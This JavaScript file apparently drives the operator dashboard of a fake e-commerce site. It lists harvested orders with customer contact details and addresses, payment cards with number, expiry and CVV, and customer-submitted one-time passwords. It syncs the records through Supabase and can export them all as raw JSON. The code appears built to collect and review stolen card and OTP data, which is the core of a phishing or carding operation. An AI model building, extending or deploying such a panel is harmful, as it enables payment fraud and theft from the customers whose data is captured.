(function () {
  'use strict';

  const PRIMARY_STORAGE_KEY = 'crm_customer_data';
  const LEGACY_STORAGE_KEYS = ['crmData', 'crm_data_cross_device', 'crm_data_hybrid', 'crm_data_v2'];
  const STORAGE_KEYS_TO_WATCH = [...LEGACY_STORAGE_KEYS, PRIMARY_STORAGE_KEY, 'crmLastSync', 'crmCloudConfig'];

  let activeTab = 'orders';
  let searchTerm = '';

  const refs = {
    refreshBtn: document.getElementById('refresh-btn'),
    forceRefreshBtn: document.getElementById('force-refresh-btn'),
    cloudSetupBtn: document.getElementById('cloud-setup-btn'),
    exportBtn: document.getElementById('export-btn'),
    searchInput: document.getElementById('search-input'),
    syncStatus: document.getElementById('sync-status'),
    statOrders: document.getElementById('stat-orders'),
    statCards: document.getElementById('stat-cards'),
    statOtp: document.getElementById('stat-otp'),
    statLast: document.getElementById('stat-last'),
    ordersBody: document.getElementById('orders-body'),
    cardsBody: document.getElementById('cards-body'),
    otpBody: document.getElementById('otp-body'),
    cloudModal: document.getElementById('cloud-modal'),
    cloudCloseBtn: document.getElementById('cloud-close-btn'),
    cloudCancelBtn: document.getElementById('cloud-cancel-btn'),
    cloudSaveBtn: document.getElementById('cloud-save-btn'),
    cloudClearBtn: document.getElementById('cloud-clear-btn'),
    cloudProjectUrl: document.getElementById('cloud-project-url'),
    cloudAnonKey: document.getElementById('cloud-anon-key'),
    cloudTable: document.getElementById('cloud-table'),
    cloudRecordId: document.getElementById('cloud-record-id')
  };

  function setChrome() {
    if (typeof window.renderHeader === 'function') {
      const headerEl = document.getElementById('header');
      if (headerEl) headerEl.innerHTML = window.renderHeader();
    }
    if (typeof window.renderFooter === 'function') {
      const footerEl = document.getElementById('footer');
      if (footerEl) footerEl.innerHTML = window.renderFooter();
    }
  }

  function escapeHtml(value) {
    return String(value == null ? '' : value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  function formatDateTime(value) {
    if (!value) return '-';
    const date = new Date(value);
    if (Number.isNaN(date.getTime())) return '-';
    return date.toLocaleString();
  }

  function formatCurrency(value) {
    const numberValue = Number(value);
    if (!Number.isFinite(numberValue)) {
      return 'Rs' + escapeHtml(value || '0');
    }
    return 'Rs' + numberValue.toLocaleString();
  }

  function maskCardNumber(number) {
    const raw = String(number || '').replace(/\s+/g, '');
    if (raw.length < 4) return escapeHtml(number || '');
    return '**** **** **** ' + escapeHtml(raw.slice(-4));
  }

  function maskCVV(cvv) {
    if (!cvv) return '***';
    return '***';
  }

  function normalizeData(data) {
    const normalized = data && typeof data === 'object' ? data : {};
    return {
      orders: Array.isArray(normalized.orders) ? normalized.orders : [],
      cards: Array.isArray(normalized.cards) ? normalized.cards : [],
      otp: Array.isArray(normalized.otp) ? normalized.otp : [],
      settings: normalized.settings && typeof normalized.settings === 'object' ? normalized.settings : {}
    };
  }

  function removeDuplicates(items, key) {
    const seen = new Set();
    return items.filter((item) => {
      const itemKey = item && item[key];
      if (!itemKey || seen.has(itemKey)) return false;
      seen.add(itemKey);
      return true;
    });
  }

  function mergeData(first, second) {
    const combined = {
      orders: [...(first.orders || []), ...(second.orders || [])],
      cards: [...(first.cards || []), ...(second.cards || [])],
      otp: [...(first.otp || []), ...(second.otp || [])]
    };

    combined.orders = removeDuplicates(combined.orders, 'id').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    combined.cards = removeDuplicates(combined.cards, 'id').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    combined.otp = removeDuplicates(combined.otp, 'id').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    return combined;
  }

  function readStorageJson(storageKey) {
    try {
      const raw = localStorage.getItem(storageKey);
      if (!raw) return null;
      return normalizeData(JSON.parse(raw));
    } catch (error) {
      return null;
    }
  }

  function getEngine() {
    return window.customerCRMFlow && typeof window.customerCRMFlow.getCRMData === 'function'
      ? window.customerCRMFlow
      : null;
  }

  function getData() {
    const engine = getEngine();
    if (engine) {
      if (typeof engine.migrateLegacyLocalData === 'function') {
        engine.migrateLegacyLocalData();
      }
      return normalizeData(engine.getCRMData());
    }

    let merged = normalizeData(readStorageJson(PRIMARY_STORAGE_KEY));
    LEGACY_STORAGE_KEYS.forEach((key) => {
      const legacy = readStorageJson(key);
      if (legacy) merged = mergeData(merged, legacy);
    });
    return merged;
  }

  function getDiagnostics() {
    const engine = getEngine();
    if (engine && typeof engine.getSyncDiagnostics === 'function') {
      return engine.getSyncDiagnostics() || {};
    }
    return {};
  }

  function getStats(data) {
    const engine = getEngine();
    if (engine && typeof engine.getCRMStats === 'function') {
      return engine.getCRMStats();
    }

    return {
      totalOrders: data.orders.length,
      totalCards: data.cards.length,
      totalOTP: data.otp.length,
      lastSync: data.settings.lastUpdated || null,
      isOnline: navigator.onLine
    };
  }

  function updateStats(data, stats) {
    refs.statOrders.textContent = String(stats.totalOrders || 0);
    refs.statCards.textContent = String(stats.totalCards || 0);
    refs.statOtp.textContent = String(stats.totalOTP || 0);
    refs.statLast.textContent = formatDateTime(stats.lastSync || data.settings.lastUpdated);
  }

  function updateSyncStatus(stats, diagnostics) {
    const online = !!stats.isOnline;
    const outcome = String(diagnostics.outcome || '');
    const cloudEnabled = !!diagnostics.cloudEnabled;
    const cloudFailure = outcome.includes('failed') || !!diagnostics.error || diagnostics.lastCloudReadOk === false || diagnostics.lastCloudWriteOk === false;

    refs.syncStatus.classList.remove('sync-ok', 'sync-warn');
    refs.syncStatus.removeAttribute('title');

    if (!online) {
      refs.syncStatus.classList.add('sync-warn');
      refs.syncStatus.textContent = 'Offline mode (local cache)';
      return;
    }

    if (!cloudEnabled) {
      refs.syncStatus.classList.add('sync-warn');
      refs.syncStatus.textContent = 'Local mode active';
      return;
    }

    if (outcome === 'cloud_config_updated' || outcome === 'cloud_config_bootstrapped') {
      refs.syncStatus.classList.add('sync-warn');
      refs.syncStatus.textContent = 'Cloud configured (sync pending)';
      return;
    }

    if (cloudFailure) {
      refs.syncStatus.classList.add('sync-warn');
      refs.syncStatus.textContent = 'Cloud issue (local fallback)';
      if (diagnostics.error) {
        refs.syncStatus.title = diagnostics.error;
      }
      return;
    }

    refs.syncStatus.classList.add('sync-ok');
    refs.syncStatus.textContent = 'Cloud sync active';
  }

  function formatOrderDetails(order) {
    const pieces = [];

    if (order.items) pieces.push(order.items);

    const location = [order.city, order.state, order.pincode].filter(Boolean).join(', ');
    if (location) pieces.push(location);

    if (order.addressType) pieces.push('Type: ' + order.addressType);
    if (order.address) pieces.push(order.address);

    return pieces.length ? escapeHtml(pieces.join(' | ')) : '-';
  }

  function matchBySearch(item) {
    if (!searchTerm) return true;
    const source = JSON.stringify(item || {}).toLowerCase();
    return source.includes(searchTerm);
  }

  function renderEmptyRow(targetBody, colSpan, message) {
    targetBody.innerHTML = `<tr><td class="empty-state" colspan="${colSpan}">${escapeHtml(message)}</td></tr>`;
  }

  function renderOrders(data) {
    const rows = data.orders.filter(matchBySearch);
    if (!rows.length) {
      renderEmptyRow(refs.ordersBody, 7, 'No order data found');
      return;
    }

    refs.ordersBody.innerHTML = rows.map((order) => `
      <tr>
        <td>${escapeHtml(formatDateTime(order.timestamp))}</td>
        <td>${escapeHtml(order.fullName || '-')}</td>
        <td>${escapeHtml(order.email || '-')}</td>
        <td>${escapeHtml(order.phone || '-')}</td>
        <td>${escapeHtml(formatCurrency(order.orderTotal))}</td>
        <td class="cell-wrap">${formatOrderDetails(order)}</td>
        <td><span class="status-chip">${escapeHtml(order.status || 'Completed')}</span></td>
      </tr>
    `).join('');
  }

  function renderCards(data) {
    const rows = data.cards.filter(matchBySearch);
    if (!rows.length) {
      renderEmptyRow(refs.cardsBody, 6, 'No card data found');
      return;
    }

    refs.cardsBody.innerHTML = rows.map((card) => `
      <tr>
        <td>${escapeHtml(formatDateTime(card.timestamp))}</td>
        <td>${escapeHtml(card.cardName || '-')}</td>
        <td>${maskCardNumber(card.cardNumber)}</td>
        <td>${escapeHtml(card.expiry || '-')}</td>
        <td>${escapeHtml(maskCVV(card.cvv))}</td>
        <td><span class="status-chip">${escapeHtml(card.status || 'Received')}</span></td>
      </tr>
    `).join('');
  }

  function renderOtp(data) {
    const rows = data.otp.filter(matchBySearch);
    if (!rows.length) {
      renderEmptyRow(refs.otpBody, 5, 'No OTP data found');
      return;
    }

    refs.otpBody.innerHTML = rows.map((otp) => `
      <tr>
        <td>${escapeHtml(formatDateTime(otp.timestamp))}</td>
        <td>${escapeHtml(otp.submittedOTP || '-')}</td>
        <td>${escapeHtml(otp.email || '-')}</td>
        <td>${escapeHtml(otp.phone || '-')}</td>
        <td><span class="status-chip">${escapeHtml(otp.status || 'Verified')}</span></td>
      </tr>
    `).join('');
  }

  function renderCurrentTab(data) {
    renderOrders(data);
    renderCards(data);
    renderOtp(data);
  }

  function activateTab(tabName) {
    activeTab = tabName;

    document.querySelectorAll('.tab-btn').forEach((tabBtn) => {
      tabBtn.classList.toggle('active', tabBtn.dataset.tab === tabName);
    });

    document.querySelectorAll('.table-wrap').forEach((panel) => {
      panel.classList.toggle('active', panel.id === 'tab-' + tabName);
    });
  }

  function getCloudConfig() {
    if (typeof window.getCRMCloudConfig === 'function') {
      return window.getCRMCloudConfig() || {};
    }
    return {};
  }

  function fillCloudForm() {
    const cfg = getCloudConfig();
    if (refs.cloudProjectUrl) refs.cloudProjectUrl.value = cfg.projectUrl || '';
    if (refs.cloudAnonKey) refs.cloudAnonKey.value = cfg.anonKey || '';
    if (refs.cloudTable) refs.cloudTable.value = cfg.table || 'crm_records';
    if (refs.cloudRecordId) refs.cloudRecordId.value = cfg.recordId || 'ecomart_global';
  }

  function openCloudModal() {
    if (!refs.cloudModal) return;
    fillCloudForm();
    refs.cloudModal.classList.add('open');
    if (refs.cloudProjectUrl) refs.cloudProjectUrl.focus();
  }

  function closeCloudModal() {
    if (!refs.cloudModal) return;
    refs.cloudModal.classList.remove('open');
  }

  function parseCloudForm() {
    const projectUrl = String(refs.cloudProjectUrl?.value || '').trim();
    const anonKey = String(refs.cloudAnonKey?.value || '').trim();
    const table = String(refs.cloudTable?.value || '').trim() || 'crm_records';
    const recordId = String(refs.cloudRecordId?.value || '').trim() || 'ecomart_global';
    return { provider: 'supabase', projectUrl, anonKey, table, recordId };
  }

  async function saveCloudConfig() {
    const config = parseCloudForm();
    if (!config.projectUrl || !/^https?:\/\//i.test(config.projectUrl)) {
      alert('Enter a valid Supabase project URL.');
      refs.cloudProjectUrl?.focus();
      return;
    }
    if (!config.anonKey) {
      alert('Enter your Supabase anon key.');
      refs.cloudAnonKey?.focus();
      return;
    }

    if (typeof window.setCRMCloudConfig !== 'function') {
      alert('Cloud setup is unavailable in this build.');
      return;
    }

    refs.cloudSaveBtn.disabled = true;
    const oldText = refs.cloudSaveBtn.textContent;
    refs.cloudSaveBtn.textContent = 'Saving...';

    try {
      window.setCRMCloudConfig(config);
      closeCloudModal();
      await refreshCRM(true);
      renderDashboard();
      const diagnostics = getDiagnostics();
      const outcome = String(diagnostics.outcome || '');
      const failed = outcome.includes('failed') || !!diagnostics.error || diagnostics.lastCloudReadOk === false || diagnostics.lastCloudWriteOk === false;

      if (failed) {
        const message = diagnostics.error || 'Cloud request failed. Check table + RLS policy.';
        alert('Cloud setup saved, but sync failed: ' + message);
      } else {
        alert('Cloud sync enabled. Data will now sync across devices.');
      }
    } catch (error) {
      console.error('Cloud setup failed:', error);
      alert('Cloud setup failed. Please recheck your details and try again.');
    } finally {
      refs.cloudSaveBtn.textContent = oldText;
      refs.cloudSaveBtn.disabled = false;
    }
  }

  async function clearCloudConfig() {
    if (typeof window.clearCRMCloudConfig !== 'function') {
      alert('Cloud setup is unavailable in this build.');
      return;
    }

    const proceed = window.confirm('Switch to local-only mode on this device?');
    if (!proceed) return;

    window.clearCRMCloudConfig();
    closeCloudModal();
    await refreshCRM(false);
    renderDashboard();
  }

  async function refreshCRM(force) {
    const targetBtn = force ? refs.forceRefreshBtn : refs.refreshBtn;
    targetBtn.disabled = true;
    const oldText = targetBtn.textContent;
    targetBtn.textContent = force ? 'Refreshing...' : 'Loading...';

    try {
      if (force && typeof window.forceCRMRefresh === 'function') {
        await window.forceCRMRefresh();
      } else if (!force && typeof window.refreshCRMData === 'function') {
        await window.refreshCRMData();
      }
    } catch (error) {
      console.error('CRM refresh error:', error);
      refs.syncStatus.classList.remove('sync-ok');
      refs.syncStatus.classList.add('sync-warn');
      refs.syncStatus.textContent = 'Refresh failed - try again';
    } finally {
      targetBtn.textContent = oldText;
      targetBtn.disabled = false;
    }

    renderDashboard();
  }

  function exportData() {
    const engine = getEngine();
    if (engine && typeof engine.exportData === 'function') {
      engine.exportData();
      return;
    }

    const data = getData();
    const dataStr = JSON.stringify(data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'crm_customer_data_' + new Date().toISOString().split('T')[0] + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  function renderDashboard() {
    const data = getData();
    const stats = getStats(data);
    const diagnostics = getDiagnostics();

    updateStats(data, stats);
    updateSyncStatus(stats, diagnostics);
    renderCurrentTab(data);
    activateTab(activeTab);
  }

  function bindEvents() {
    refs.refreshBtn.addEventListener('click', () => refreshCRM(false));
    refs.forceRefreshBtn.addEventListener('click', () => refreshCRM(true));
    refs.exportBtn.addEventListener('click', exportData);
    refs.cloudSetupBtn.addEventListener('click', openCloudModal);
    refs.cloudCloseBtn.addEventListener('click', closeCloudModal);
    refs.cloudCancelBtn.addEventListener('click', closeCloudModal);
    refs.cloudSaveBtn.addEventListener('click', saveCloudConfig);
    refs.cloudClearBtn.addEventListener('click', clearCloudConfig);

    refs.searchInput.addEventListener('input', (event) => {
      searchTerm = String(event.target.value || '').trim().toLowerCase();
      renderDashboard();
    });

    document.querySelectorAll('.tab-btn').forEach((tabBtn) => {
      tabBtn.addEventListener('click', () => {
        activateTab(tabBtn.dataset.tab);
      });
    });

    window.addEventListener('storage', (event) => {
      if (STORAGE_KEYS_TO_WATCH.includes(event.key)) {
        renderDashboard();
      }
    });

    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) {
        renderDashboard();
      }
    });

    document.addEventListener('keydown', (event) => {
      if (event.key === 'Escape') {
        closeCloudModal();
      }
    });

    refs.cloudModal.addEventListener('click', (event) => {
      if (event.target === refs.cloudModal) {
        closeCloudModal();
      }
    });

    setInterval(() => {
      renderDashboard();
    }, 5000);
  }

  function init() {
    setChrome();
    bindEvents();
    refreshCRM(false);
  }

  document.addEventListener('DOMContentLoaded', init);
})();
